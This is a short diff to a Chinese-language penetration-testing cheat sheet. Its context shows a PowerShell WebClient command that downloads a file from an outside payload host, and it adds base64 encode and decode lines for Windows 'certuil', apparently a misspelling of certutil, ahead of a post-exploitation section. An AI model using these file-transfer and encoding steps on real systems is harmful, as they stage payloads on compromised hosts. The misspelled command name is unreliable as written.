@@ -9,7 +9,11 @@ powershell
 $client = new-object System.Net.WebClient
 $client.DownloadFile(‘http://payloads.online/file.tar.gz', ‘E:\file.tar.gz’)
 ```
-
+### certuil
+```
+certuil -encode in out # 转base64
+certuil -decode out in # 还原
+```
 ## 渗透后置操作
 
 ```bat
